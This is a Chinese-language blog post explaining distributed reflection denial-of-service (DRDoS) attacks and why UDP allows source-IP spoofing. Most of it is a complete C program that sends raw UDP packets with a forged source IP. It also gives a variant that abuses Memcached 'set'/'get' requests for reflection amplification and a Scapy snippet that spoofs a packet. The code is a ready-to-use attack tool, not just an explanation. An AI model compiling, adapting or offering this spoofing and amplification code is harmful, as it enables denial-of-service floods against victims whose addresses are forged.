---
categories: C++/C
date: "2018-03-04T00:00:00Z"
description: 本文概述一下使用C语言发送伪造源IP的UDP请求及DRDoS拒绝服务攻击原理剖析
title: 使用C语言发送伪造源IP的UDP请求及DRDOS拒绝服务攻击原理剖析
url: /archivers/2018-03-04/1
---
本文概述一下使用C语言发送伪造源IP的UDP请求及DRDoS拒绝服务攻击原理剖析
<!--more-->

* 目录
{:toc}

## 0x01 什么是DRDOS

DRDoS是英文“Distributed Reflection Denial of Service ”的缩写，中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。

## 0x02 DRDOS的攻击流程

DRDoS要完成一次反射放大攻击：

*  1 攻击者，必须提前需要把攻击数据存放在所有的在线肉鸡或者反射服务器之上。
*  2 攻击者，必须伪造IP源头。发送海量伪造IP来源的请求。当然这里的IP就是受害者的IP地址。
*  3 反射服务器，必须可以反射数据，运行良好稳定。最好是请求数据少，返回数据成万倍增加。

## 0x03 DRDOS的特性

（如果没有理解UDP协议，请不要向下继续阅读……会越来越混乱）

根据上述概念可以理解为，DRDOS需要一个能够伪造IP头的协议，这个协议最突出的就是UDP协议了。

1. 使用基于 TCP 协议的通信不可以对源 IP 地址进行伪造 
2. 使用基于 UDP 协议的通信可以对源 IP 地址进行伪造

TCP 不能伪造源 IP 地址是因为 TCP 协议中的三次握手的存在，如果源 IP 地址被修改，那么三次握手将无法达成。

而 UDP 则不同，UDP 中不存在三次握手，那么发送端就只要发送数据即可，而接收端只要接收数据即可。所以，在 TCP 中不能对源 IP 地址进行伪造，而 UDP 中则可以。


UDP协议不需要握手，直接发送接收，下面我来通过小故事来形象的描述UDP中的伪造IP头攻击：

> 假设有三个用户，Allen、Jerry、Tom.

### Jerry与Tom一次正常的UDP请求

`Jerry说：`“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”

此时Tom的4478端口接收到一个UDP报文，需要回复内容，回复给谁呢，接下来需要根据报文中的IP头确定是谁发送的

通过Jerry的话确定发送方是Jerry，而Jerry的端口是4787，那么Tom就会将数据传送给Jerry

`Tom说：`“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”

### Allen进行一次RDOS攻击

`Allen说：`“我是Jerry，我的源端口是4787，我要向Tom的4478端口发送一个UDP报文”

此时Tom接收到报文，根据上面这句话确定了发送人是Jerry，目的端口是4787

`Tom说：`“我是Tom，我的源端口是4478，根据刚才接收到的一句话中，确认了发送人是Jerry，我把数据传送给Jerry的4787端口”

这个过程当中，Jerry并没有参与通信，但是接到了一个从Tom那里发送过来的UDP数据报文

## 0x04 编写一个伪造IP头的C语言程序

> /usr/include/netinet/ip.h

这里面定义了IP头

```cpp
struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ip_hl:4;		/* header length */
    unsigned int ip_v:4;		/* version */
#endif
#if __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ip_v:4;		/* version */
    unsigned int ip_hl:4;		/* header length */
#endif
    uint8_t ip_tos;			/* type of service */
    unsigned short ip_len;		/* total length */
    unsigned short ip_id;		/* identification */
    unsigned short ip_off;		/* fragment offset field */
#define	IP_RF 0x8000			/* reserved fragment flag */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
    uint8_t ip_ttl;			/* time to live */
    uint8_t ip_p;			/* protocol */
    unsigned short ip_sum;		/* checksum */
    struct in_addr ip_src, ip_dst;	/* source and dest address */
  };
```

> /usr/include/netinet/udp.h

这里面定义了UDP报文结构

```cpp
struct udphdr
{
  __extension__ union
  {
    struct
    {
      uint16_t uh_sport;	/* source port */
      uint16_t uh_dport;	/* destination port */
      uint16_t uh_ulen;		/* udp length */
      uint16_t uh_sum;		/* udp checksum */
    };
    struct
    {
      uint16_t source;
      uint16_t dest;
      uint16_t len;
      uint16_t check;
    };
  };
};
```

程序如下：

```cpp
/**
 * @file ip_udp_send.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

/* ip首部长度 */
#define IP_HEADER_LEN sizeof(struct ip)
/* udp首部长度 */
#define UDP_HEADER_LEN sizeof(struct udphdr)
/* ip首部 + udp首部长度 */
#define IP_UDP_HEADER_LEN IP_HEADER_LEN + UDP_HEADER_LEN

void err_exit(const char *err_msg)
{
    perror(err_msg);
    exit(1);
}

/* 填充ip首部 */
struct ip *fill_ip_header(const char *src_ip, const char *dst_ip, int ip_packet_len)
{
    struct ip *ip_header;

    ip_header = (struct ip *)malloc(IP_HEADER_LEN);
    ip_header->ip_v = IPVERSION;
    ip_header->ip_hl = IP_HEADER_LEN / 4;
    ip_header->ip_tos = 0;
    ip_header->ip_len = htons(ip_packet_len);
    ip_header->ip_id = 0;
    ip_header->ip_off = 0;
    ip_header->ip_ttl = MAXTTL;
    ip_header->ip_p = IPPROTO_UDP;        /* 这里是UDP */
    ip_header->ip_sum = 0;
    ip_header->ip_src.s_addr = inet_addr(src_ip);
    ip_header->ip_dst.s_addr = inet_addr(dst_ip);

    return ip_header;
}

/* 填充udp首部 */
struct udphdr *fill_udp_header(int src_port, int dst_port, int udp_packet_len)
{
    struct udphdr *udp_header;

    udp_header = (struct udphdr *)malloc(UDP_HEADER_LEN);
    udp_header->source = htons(src_port);
    udp_header->dest = htons(dst_port);
    /* 这里的长度是整个UDP报文 */
    udp_header->len = htons(udp_packet_len);
    udp_header->check = 0;

    return udp_header;
}

/* 发送ip_udp报文 */
void ip_udp_send(const char *src_ip, int src_port, const char *dst_ip, int dst_port, const char *data)
{
    struct ip *ip_header;
    struct udphdr *udp_header;
    struct sockaddr_in dst_addr;
    socklen_t sock_addrlen = sizeof(struct sockaddr_in);

    int data_len = strlen(data);
    int ip_packet_len = IP_UDP_HEADER_LEN + data_len;
    int udp_packet_len = UDP_HEADER_LEN + data_len;
    char buf[ip_packet_len];
    int sockfd, ret_len, on = 1;

    bzero(&dst_addr, sock_addrlen);
    dst_addr.sin_family = PF_INET;
    dst_addr.sin_addr.s_addr = inet_addr(dst_ip);
    dst_addr.sin_port = htons(dst_port);

    /* 创建udp原始套接字 */
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
        err_exit("socket()");

    /* 开启IP_HDRINCL，自定义IP首部 */
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)
        err_exit("setsockopt()");

    /* ip首部 */
    ip_header = fill_ip_header(src_ip, dst_ip, ip_packet_len);
    /* udp首部 */
    udp_header = fill_udp_header(src_port, dst_port, udp_packet_len);

    bzero(buf, ip_packet_len);
    memcpy(buf, ip_header, IP_HEADER_LEN);
    memcpy(buf + IP_HEADER_LEN, udp_header, UDP_HEADER_LEN);
    memcpy(buf + IP_UDP_HEADER_LEN, data, data_len);

    /* 发送报文 */
    ret_len = sendto(sockfd, buf, ip_packet_len, 0, (struct sockaddr *)&dst_addr, sock_addrlen);
    if (ret_len > 0)
        printf("sendto() ok!!!\n");
    else printf("sendto() failed\n");

    close(sockfd);
    free(ip_header);
    free(udp_header);
}

int main(int argc, const char *argv[])
{
    if (argc != 6)
    {
        printf("usage:%s src_ip src_port dst_ip dst_port data\n", argv[0]);
        exit(1);
    }

    /* 发送ip_udp报文 */
    ip_udp_send(argv[1], atoi(argv[2]), argv[3], atoi(argv[4]), argv[5]);

    return 0;
}
```

如果要利用Memcached漏洞：

```cpp

int main(int argc, const char *argv[])
{
    if (argc != 5)
    {
        printf("usage:%s src_ip src_port dst_ip dst_port data\n", argv[0]);
        exit(1);
    }
    char setBuff[65535]="set AAAA 0 1000";
    /* 发送ip_udp报文 */
    ip_udp_send(argv[1], atoi(argv[2]), argv[3], atoi(argv[4]), setBuff);
    
    char getBuff[65535]="get AAAA";
    ip_udp_send(argv[1], atoi(argv[2]), argv[3], atoi(argv[4]), getBuff);

    return 0;
}
```

## 0x05 其他方式

Python Scapy 伪造网络数据包

```

>>> data = "Hello Scapy"
>>> pkt = IP(src='172.16.2.135', dst='172.16.2.91')/UDP(sport=12345, dport=5555)/data
>>> send(pkt, inter=1, count=1)
```





